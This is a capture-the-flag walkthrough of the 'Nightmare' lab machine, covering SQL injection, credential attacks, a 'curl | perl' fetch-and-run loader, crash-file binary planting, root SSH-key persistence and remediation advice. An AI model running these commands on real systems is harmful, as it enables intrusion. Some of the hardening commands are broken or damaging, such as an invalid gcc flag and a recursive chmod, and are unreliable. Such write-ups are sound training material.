<!doctype html><html lang=en><head><title>Nightmare HTB - Insane Linux Box Walkthrough :: VAPT Walkthroughs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Complete walkthrough of Nightmare HTB machine featuring second-order SQL injection, SFTP exploit development, in-memory ELF execution, crash dump exploitation, and kernel-based privilege escalation techniques"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://malayamanas.github.io/posts/nightmare-htb-walkthrough/><link rel=stylesheet href=https://malayamanas.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://malayamanas.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://malayamanas.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://malayamanas.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://malayamanas.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://malayamanas.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://malayamanas.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://malayamanas.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://malayamanas.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://malayamanas.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://malayamanas.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://malayamanas.github.io/terminal.css><link rel="shortcut icon" href=https://malayamanas.github.io/favicon.png><link rel=apple-touch-icon href=https://malayamanas.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Nightmare HTB - Insane Linux Box Walkthrough"><meta property="og:description" content="Complete walkthrough of Nightmare HTB machine featuring second-order SQL injection, SFTP exploit development, in-memory ELF execution, crash dump exploitation, and kernel-based privilege escalation techniques"><meta property="og:url" content="https://malayamanas.github.io/posts/nightmare-htb-walkthrough/"><meta property="og:site_name" content="VAPT Walkthroughs"><meta property="og:image" content="https://malayamanas.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="HTB"><meta property="article:section" content="Linux"><meta property="article:published_time" content="2025-09-22 09:45:00 +0000 UTC"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://malayamanas.github.io/><div class=logo>Terminal</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://malayamanas.github.io/posts/nightmare-htb-walkthrough/>Nightmare HTB - Insane Linux Box Walkthrough</a></h1><div class=post-meta><time class=post-date>2025-09-22</time></div><span class=post-tags>#<a href=https://malayamanas.github.io/tags/insane-linux/>insane-linux</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/web/>web</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/sql-injection/>sql-injection</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/sftp/>sftp</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/kernel-exploit/>kernel-exploit</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/in-memory-elf/>in-memory-elf</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/crash-dump/>crash-dump</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/privilege-escalation/>privilege-escalation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/32-bit/>32-bit</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/ubuntu-xenial/>ubuntu-xenial</a>&nbsp;</span><div class=post-content><div><h1 id=nightmare-htb---insane-linux-box-walkthrough>Nightmare HTB - Insane Linux Box Walkthrough<a href=#nightmare-htb---insane-linux-box-walkthrough class=hanchor arialabel=Anchor>#</a></h1><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/TVhtjiSedjU?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=key-exploitation-steps-and-techniques>Key Exploitation Steps and Techniques<a href=#key-exploitation-steps-and-techniques class=hanchor arialabel=Anchor>#</a></h2><p>Below is a chronological extraction of the key exploitation steps and techniques from the provided data, focusing on the primary and unintended methods used to exploit the &ldquo;Nightmare&rdquo; machine, as described in the transcript.</p><h3 id=primary-exploitation-path>Primary Exploitation Path<a href=#primary-exploitation-path class=hanchor arialabel=Anchor>#</a></h3><ol><li><p><strong>Initial Reconnaissance (Nmap Scan)</strong>:</p><ul><li>Technique: Network scanning with Nmap.</li><li>Step: Run Nmap to identify open ports: Apache on port 80 and SSH on port 2222, with patches on Ubuntu Xenial (32-bit system indicated by SSH flags).</li></ul></li><li><p><strong>Web Application Testing (Apache on Port 80)</strong>:</p><ul><li>Technique: Web application vulnerability testing.</li><li>Step: Attempt to register a user on the web application, testing for cross-site scripting (XSS) by inputting random characters in username and password fields. Observe a SQL error, indicating potential SQL injection.</li></ul></li><li><p><strong>SQL Injection (Second-Order SQL Injection)</strong>:</p><ul><li>Technique: SQL injection via user registration.</li><li>Step: Register a user with a crafted username (e.g., <code>a' union select 1,2 --</code>) to test for SQL injection. Confirm SQL injection vulnerability in the username field due to a <code>SELECT * WHERE username =</code> query structure.</li></ul></li><li><p><strong>Database Enumeration (Union-Based SQL Injection)</strong>:</p><ul><li>Technique: Union-based SQL injection to enumerate database schema.</li><li>Step: Use <code>UNION SELECT table_schema,table_name,column_name FROM information_schema.columns --</code> to dump database tables. Identify the <code>users</code> table with <code>username</code> and <code>password</code> columns.</li></ul></li><li><p><strong>Extract Credentials</strong>:</p><ul><li>Technique: Credential extraction via SQL injection.</li><li>Step: Dump credentials (e.g., username: <code>admin</code>, password: [hashed or plaintext]) and save them to a text file using a delimiter (e.g., colon).</li></ul></li><li><p><strong>Credential-Based Attack (Hydra on SSH/SFTP)</strong>:</p><ul><li>Technique: Brute-forcing credentials with Hydra.</li><li>Step: Use Hydra with the extracted credentials (<code>hydra -C user_pass.txt ssh://[TARGET-IP] -p 2222</code>) to attempt SSH login. Identify that the service is SFTP, not SSH, and attempt SFTP login with credentials (e.g., <code>sftp -P 2222 ftpuser@[TARGET-IP]</code>).</li></ul></li><li><p><strong>SFTP Exploit (Privilege Escalation)</strong>:</p><ul><li>Technique: Exploit development and execution.</li><li>Step: Identify an SFTP exploit from a full disclosure post. Modify the 64-bit exploit code to work on a 32-bit system by changing <code>long long</code> to <code>int</code>, <code>size_t</code> to <code>unsigned int</code>, and adjusting memory addresses. Compile the exploit with appropriate flags and execute it (<code>./sh_exploit [TARGET-IP] ftpuser</code>).</li></ul></li><li><p><strong>Privilege Escalation (Kernel Exploit)</strong>:</p><ul><li>Technique: Kernel exploit to gain root access.</li><li>Step: Identify the kernel version (<code>uname -a</code>) and search for a matching exploit for Ubuntu Xenial. Compile the kernel exploit (<code>gcc -o exploit kernel.c</code>) on a separate system, transfer it to the target via <code>curl</code> or Python HTTP server, and execute it to gain root access.</li></ul></li><li><p><strong>Persistence (Modify LSB Release)</strong>:</p><ul><li>Technique: System manipulation for exploit compatibility.</li><li>Step: Modify <code>/etc/lsb-release</code> to mimic a vulnerable Ubuntu Xenial version (e.g., change distro name to &ldquo;Bladerunner&rdquo;) to ensure the kernel exploit works. Recompile and execute the exploit to achieve root.</li></ul></li></ol><h3 id=unintended-exploitation-paths>Unintended Exploitation Paths<a href=#unintended-exploitation-paths class=hanchor arialabel=Anchor>#</a></h3><h4 id=1-in-memory-elf-execution-inspired-by-mubix>1. In-Memory ELF Execution (Inspired by muBIX)<a href=#1-in-memory-elf-execution-inspired-by-mubix class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Technique</strong>: Execute ELF binaries in memory without disk writes, bypassing restrictions like <code>/tmp</code> or <code>/dev/shm</code>.</li><li><strong>Steps</strong>:<ol><li><strong>Research and Setup</strong>: Find a blog post on in-memory ELF execution and extract a Perl command to prepare the binary (<code>elf-prep.sh</code>).</li><li><strong>Prepare Binary</strong>: Run <code>bash elf-prep.sh pone</code> to convert the binary (<code>pone</code>) into hex format for in-memory loading.</li><li><strong>Create Loader Script</strong>: Combine <code>elf_load.pl.head</code>, <code>elf_load.pl.body</code> (hex output), and <code>elf_load.pl.tail</code> into <code>elf_load.pl</code> to execute the binary in memory.</li><li><strong>Transfer and Execute</strong>: Start a Python HTTP server on the attacker&rsquo;s machine, use <code>curl [TARGET-IP]/elf_load.pl | perl</code> on the target to execute the binary, gaining a shell.</li><li><strong>Stabilize Shell</strong>: Modify the exploit to write an SSH key to <code>/root/.ssh/authorized_keys</code> for persistent root access (<code>ssh -i key root@[TARGET-IP] -p 2222</code>).</li><li><strong>Troubleshooting</strong>: Address sandbox issues (e.g., network restrictions on <code>ens33</code> or loopback) by adjusting the exploit code to avoid network dependencies.</li></ol></li></ul><h4 id=2-crash-dump-exploitation-hack-the-box-forum>2. Crash Dump Exploitation (Hack The Box Forum)<a href=#2-crash-dump-exploitation-hack-the-box-forum class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Technique</strong>: Exploit a process crash dump that creates a file with 777 permissions, allowing arbitrary binary execution.</li><li><strong>Steps</strong>:<ol><li><strong>Identify Vulnerable Process</strong>: Find the SFTP process (<code>pgrep -u ftpuser -l</code>) running as the <code>ftpuser</code>.</li><li><strong>Trigger Crash Dump</strong>: Send a <code>SIGSEGV</code> signal (<code>kill -11 1681</code>) to the SFTP process to create a crash dump file (<code>/lock</code>) with 777 permissions.</li><li><strong>Overwrite Crash Dump</strong>: Write a malicious ELF binary (e.g., <code>pone</code>) to the crash dump file (<code>curl [TARGET-IP]/pone -o /lock</code>).</li><li><strong>Execute Binary</strong>: Run the modified crash dump file (<code>./lock</code>) to gain a shell.</li><li><strong>Gain Root Access</strong>: Use the shell to achieve root privileges or write an SSH key for persistent access.</li></ol></li></ul><h3 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Primary Path</strong>: Uses Nmap, SQL injection, credential extraction, SFTP exploit, and kernel exploit to gain root access, with additional manipulation of <code>/etc/lsb-release</code> for compatibility.</li><li><strong>Unintended Path 1 (In-Memory ELF)</strong>: Leverages in-memory ELF execution to bypass disk write restrictions, achieving root via a Perl script and SSH key persistence.</li><li><strong>Unintended Path 2 (Crash Dump)</strong>: Exploits a crash dump file&rsquo;s permissive permissions to execute a malicious binary, gaining root access.</li></ul><p>These steps outline the exploitation process in chronological order, covering both the intended and unintended methods described in the transcript.</p><h2 id=security-gaps-and-remediation>Security Gaps and Remediation<a href=#security-gaps-and-remediation class=hanchor arialabel=Anchor>#</a></h2><p>Based on the provided transcript detailing the exploitation of the &ldquo;Nightmare&rdquo; machine, several vulnerabilities were exploited across different services and systems. Below, I identify the gaps in each service or system and provide recommendations for fixing them with either proper source code fixes or configuration changes. The vulnerabilities are categorized by the affected service or system (Web Application, SFTP, and Kernel/System), and the fixes focus on addressing the root causes to prevent exploitation.</p><h3 id=1-web-application-apache-on-port-80>1. Web Application (Apache on Port 80)<a href=#1-web-application-apache-on-port-80 class=hanchor arialabel=Anchor>#</a></h3><h4 id=gaps-and-vulnerabilities>Gaps and Vulnerabilities<a href=#gaps-and-vulnerabilities class=hanchor arialabel=Anchor>#</a></h4><ul><li><p><strong>SQL Injection (Second-Order SQL Injection)</strong>:</p><ul><li><strong>Gap</strong>: The web application allows user input (username field during registration) to be directly included in SQL queries without proper sanitization, enabling SQL injection. The transcript mentions a SQL error when registering with malformed input and successful <code>UNION SELECT</code> queries to extract database information.</li><li><strong>Impact</strong>: Attackers can enumerate database schema, extract sensitive data (e.g., usernames and passwords), and potentially escalate privileges.</li></ul></li><li><p><strong>Cross-Site Scripting (XSS) Testing</strong>:</p><ul><li><strong>Gap</strong>: The application accepts arbitrary input in username and password fields without validation, suggesting potential XSS vulnerabilities (though not fully exploited in the transcript).</li><li><strong>Impact</strong>: If XSS is exploitable, attackers could inject malicious scripts to steal user sessions or perform unauthorized actions.</li></ul></li></ul><h4 id=fixes>Fixes<a href=#fixes class=hanchor arialabel=Anchor>#</a></h4><ul><li><p><strong>SQL Injection</strong>:</p><ul><li><strong>Source Code Fix</strong>:<ul><li>Use <strong>prepared statements</strong> or <strong>parameterized queries</strong> in the application code to prevent SQL injection. For example, in PHP, use PDO or MySQLi with parameterized queries:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$stmt <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;SELECT * FROM users WHERE username = ?&#34;</span>);
</span></span><span style=display:flex><span>$stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>([$username]);
</span></span></code></pre></div></li><li>Implement input validation to ensure usernames and passwords conform to expected formats (e.g., alphanumeric characters only).</li><li>Sanitize and escape all user inputs before processing them in SQL queries.</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Enable strict SQL mode on the database server to reject invalid queries.</li><li>Configure the web application to limit database permissions, ensuring the application user has only the minimum required privileges (e.g., no access to <code>information_schema</code>).</li><li>Use a Web Application Firewall (WAF) to detect and block SQL injection patterns.</li></ul></li></ul></li><li><p><strong>Cross-Site Scripting (XSS)</strong>:</p><ul><li><strong>Source Code Fix</strong>:<ul><li>Implement input validation to reject or sanitize special characters (e.g., <code>&lt;</code>, <code>></code>, <code>"</code>, <code>'</code>) in username and password fields.</li><li>Use output encoding when displaying user input (e.g., <code>htmlspecialchars()</code> in PHP) to prevent script execution.</li><li>Set Content Security Policy (CSP) headers to restrict script sources:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Content-Security-Policy: script-src &#39;self&#39;;
</span></span></span></code></pre></div></li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Configure the web server to set HTTP headers like <code>X-XSS-Protection: 1; mode=block</code> to enable browser XSS filtering.</li><li>Ensure cookies are marked with <code>HttpOnly</code> and <code>Secure</code> flags to prevent access via JavaScript:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>session_set_cookie_params</span>([<span style=color:#e6db74>&#39;httponly&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>true</span>, <span style=color:#e6db74>&#39;secure&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>true</span>]);
</span></span></code></pre></div></li></ul></li></ul></li></ul><h3 id=2-sftp-service-port-2222>2. SFTP Service (Port 2222)<a href=#2-sftp-service-port-2222 class=hanchor arialabel=Anchor>#</a></h3><h4 id=gaps-and-vulnerabilities-1>Gaps and Vulnerabilities<a href=#gaps-and-vulnerabilities-1 class=hanchor arialabel=Anchor>#</a></h4><ul><li><p><strong>Vulnerable SFTP Implementation</strong>:</p><ul><li><strong>Gap</strong>: The SFTP service (likely OpenSSH or a similar implementation) is running a version vulnerable to a specific exploit, allowing remote code execution or privilege escalation. The transcript mentions a full disclosure post and modifications to exploit code for 32-bit compatibility.</li><li><strong>Impact</strong>: Attackers can execute arbitrary code or gain unauthorized access to the system as the <code>ftpuser</code>.</li></ul></li><li><p><strong>Crash Dump with Permissive Permissions</strong>:</p><ul><li><strong>Gap</strong>: When the SFTP process crashes, it generates a crash dump file (<code>/lock</code>) with 777 permissions, allowing any user to overwrite it with a malicious binary.</li><li><strong>Impact</strong>: Attackers can replace the crash dump with an executable to gain unauthorized access or escalate privileges.</li></ul></li></ul><h4 id=fixes-1>Fixes<a href=#fixes-1 class=hanchor arialabel=Anchor>#</a></h4><ul><li><p><strong>Vulnerable SFTP Implementation</strong>:</p><ul><li><strong>Source Code Fix</strong>:<ul><li>Update the SFTP software (e.g., OpenSSH) to the latest stable version to patch known vulnerabilities. The transcript indicates a &ldquo;not so recent version,&rdquo; suggesting an outdated installation.</li><li>If custom SFTP software is used, audit and patch the code to address memory corruption or other vulnerabilities exploited in the transcript (e.g., improper handling of 32-bit vs. 64-bit memory addresses).</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Configure the SFTP server to run in a chroot jail to restrict access to the filesystem:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Subsystem sftp internal-sftp
</span></span><span style=display:flex><span>Match User ftpuser
</span></span><span style=display:flex><span>    ChrootDirectory /home/ftpuser
</span></span><span style=display:flex><span>    ForceCommand internal-sftp
</span></span></code></pre></div></li><li>Harden SSH/SFTP configuration in <code>/etc/ssh/sshd_config</code>:<ul><li>Disable root login: <code>PermitRootLogin no</code>.</li><li>Restrict allowed users: <code>AllowUsers ftpuser</code>.</li><li>Use strong ciphers and disable deprecated algorithms: <code>Ciphers aes256-ctr,aes192-ctr,aes128-ctr</code>.</li></ul></li><li>Apply system-wide security patches regularly using <code>apt update && apt upgrade</code> on Ubuntu.</li></ul></li></ul></li><li><p><strong>Crash Dump with Permissive Permissions</strong>:</p><ul><li><strong>Source Code Fix</strong>:<ul><li>Modify the SFTP software or system crash handling to set restrictive permissions (e.g., 600) on crash dump files or disable crash dumps entirely if not needed.</li><li>If using a custom SFTP implementation, ensure crash dump files are written to a secure directory accessible only by root.</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Configure the system to restrict crash dump permissions via <code>sysctl</code>:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;fs.suid_dumpable = 0&#34;</span> &gt;&gt; /etc/sysctl.conf
</span></span><span style=display:flex><span>sysctl -p
</span></span></code></pre></div>This disables setuid/setgid binaries from creating core dumps.</li><li>Set <code>ulimit -c 0</code> for the SFTP user to disable core dumps:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;ftpuser hard core 0&#34;</span> &gt;&gt; /etc/security/limits.conf
</span></span></code></pre></div></li><li>Ensure crash dump directories (e.g., <code>/var/crash</code>) have restrictive permissions:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>700</span> /var/crash
</span></span><span style=display:flex><span>chown root:root /var/crash
</span></span></code></pre></div></li></ul></li></ul></li></ul><h3 id=3-kernelsystem>3. Kernel/System<a href=#3-kernelsystem class=hanchor arialabel=Anchor>#</a></h3><h4 id=gaps-and-vulnerabilities-2>Gaps and Vulnerabilities<a href=#gaps-and-vulnerabilities-2 class=hanchor arialabel=Anchor>#</a></h4><ul><li><p><strong>Outdated Kernel (Ubuntu Xenial)</strong>:</p><ul><li><strong>Gap</strong>: The system runs an outdated Ubuntu Xenial kernel (e.g., 4.8.0-58) vulnerable to a known exploit, allowing privilege escalation to root.</li><li><strong>Impact</strong>: Attackers can execute a kernel exploit to gain root access, bypassing user-level restrictions.</li></ul></li><li><p><strong>Writable <code>/etc/lsb-release</code></strong>:</p><ul><li><strong>Gap</strong>: The <code>/etc/lsb-release</code> file is writable by the <code>ftpuser</code>, allowing attackers to modify system identification to trick exploits into targeting specific vulnerabilities.</li><li><strong>Impact</strong>: Facilitates kernel exploit execution by mimicking a vulnerable system configuration.</li></ul></li><li><p><strong>Lack of Binary Protections</strong>:</p><ul><li><strong>Gap</strong>: The system allows execution of arbitrary binaries (e.g., via crash dumps or in-memory execution) without modern protections like Address Space Layout Randomization (ASLR) or stack-smashing protection.</li><li><strong>Impact</strong>: Simplifies exploitation by allowing predictable memory addresses and unchecked binary execution.</li></ul></li></ul><h4 id=fixes-2>Fixes<a href=#fixes-2 class=hanchor arialabel=Anchor>#</a></h4><ul><li><p><strong>Outdated Kernel</strong>:</p><ul><li><strong>Source Code Fix</strong>:<ul><li>N/A (kernel source code fixes are typically handled by upstream updates).</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Upgrade the kernel to the latest stable version for Ubuntu Xenial or migrate to a supported Ubuntu version (e.g., Focal or Jammy):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apt update <span style=color:#f92672>&amp;&amp;</span> apt install linux-generic
</span></span></code></pre></div></li><li>Enable automatic security updates for the kernel:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apt install unattended-upgrades
</span></span><span style=display:flex><span>dpkg-reconfigure --priority<span style=color:#f92672>=</span>low unattended-upgrades
</span></span></code></pre></div></li><li>Reboot the system after kernel updates to ensure the new kernel is loaded.</li></ul></li></ul></li><li><p><strong>Writable <code>/etc/lsb-release</code></strong>:</p><ul><li><strong>Source Code Fix</strong>:<ul><li>N/A (this is a configuration issue, not a code issue).</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Restrict permissions on <code>/etc/lsb-release</code> to prevent modification by non-root users:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>644</span> /etc/lsb-release
</span></span><span style=display:flex><span>chown root:root /etc/lsb-release
</span></span></code></pre></div></li><li>Use AppArmor or SELinux to enforce stricter access controls on system files:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apparmor_parser -r /etc/apparmor.d/usr.sbin.sshd
</span></span></code></pre></div></li><li>Monitor file changes with tools like <code>auditd</code> to detect unauthorized modifications:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>auditctl -w /etc/lsb-release -p wa -k lsb-release
</span></span></code></pre></div></li></ul></li></ul></li><li><p><strong>Lack of Binary Protections</strong>:</p><ul><li><strong>Source Code Fix</strong>:<ul><li>Recompile critical binaries with stack-smashing protection (<code>-fstack-protect</code>) and position-independent code (<code>-fPIE</code>):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gcc -fstack-protect -fPIE -o binary source.c
</span></span></code></pre></div></li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Enable ASLR system-wide:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;kernel.randomize_va_space = 2&#34;</span> &gt;&gt; /etc/sysctl.conf
</span></span><span style=display:flex><span>sysctl -p
</span></span></code></pre></div></li><li>Use a Mandatory Access Control (MAC) system like AppArmor or SELinux to restrict binary execution:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apparmor_parser -r /etc/apparmor.d/usr.bin.sftp
</span></span></code></pre></div></li><li>Restrict executable permissions on user-writable directories:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -type d -perm -o+w -exec chmod o-x <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span>
</span></span></code></pre></div></li><li>Disable execution in temporary directories:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mount -o remount,noexec /tmp
</span></span><span style=display:flex><span>mount -o remount,noexec /dev/shm
</span></span></code></pre></div></li></ul></li></ul></li></ul><h3 id=additional-general-fixes>Additional General Fixes<a href=#additional-general-fixes class=hanchor arialabel=Anchor>#</a></h3><ul><li><p><strong>Network Exposure</strong>:</p><ul><li><strong>Gap</strong>: Unnecessary ports (80, 2222) are exposed, increasing the attack surface.</li><li><strong>Configuration Fix</strong>:<ul><li>Use a firewall (e.g., <code>ufw</code>) to restrict access to only necessary services:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ufw allow 2222/tcp
</span></span><span style=display:flex><span>ufw deny 80/tcp
</span></span><span style=display:flex><span>ufw enable
</span></span></code></pre></div></li><li>Implement network segmentation to limit access to the SFTP and web services.</li></ul></li></ul></li><li><p><strong>Weak Authentication</strong>:</p><ul><li><strong>Gap</strong>: The <code>ftpuser</code> account has weak or predictable credentials, and the system allows brute-forcing via Hydra.</li><li><strong>Configuration Fix</strong>:<ul><li>Enforce strong password policies using <code>pam_pwquality</code>:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apt install libpam-pwquality
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;password requisite pam_pwquality.so retry=3 minlen=12&#34;</span> &gt;&gt; /etc/pam.d/common-password
</span></span></code></pre></div></li><li>Limit login attempts with <code>fail2ban</code>:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apt install fail2ban
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[sshd]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>enabled = true
</span></span></span><span style=display:flex><span><span style=color:#e6db74>maxretry = 3
</span></span></span><span style=display:flex><span><span style=color:#e6db74>bantime = 3600&#34;</span> &gt;&gt; /etc/fail2ban/jail.local
</span></span><span style=display:flex><span>systemctl restart fail2ban
</span></span></code></pre></div></li></ul></li></ul></li></ul><h3 id=summary-1>Summary<a href=#summary-1 class=hanchor arialabel=Anchor>#</a></h3><p>The &ldquo;Nightmare&rdquo; machine has significant vulnerabilities in its web application (SQL injection, potential XSS), SFTP service (exploitable implementation, permissive crash dumps), and kernel/system (outdated kernel, writable system files, lack of binary protections). By implementing the recommended source code and configuration fixesâ€”such as prepared statements, updated software, restricted permissions, and modern security mechanismsâ€”these gaps can be mitigated to prevent exploitation.</p><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>#</a></h2><p>Nightmare is an excellent machine that demonstrates the complexity of 32-bit system exploitation and advanced binary execution techniques. It requires expertise in:</p><ul><li>Second-order SQL injection exploitation and database enumeration</li><li>SFTP service vulnerability analysis and exploit adaptation for 32-bit systems</li><li>In-memory ELF execution techniques for stealth and persistence</li><li>Crash dump exploitation and file permission abuse</li><li>Kernel exploit development and system manipulation</li><li>Advanced privilege escalation through multiple attack vectors</li></ul><p>The machine emphasizes the importance of proper input validation, regular software updates, secure file permissions, and modern binary protections in system hardening.</p><hr><p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>Â© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
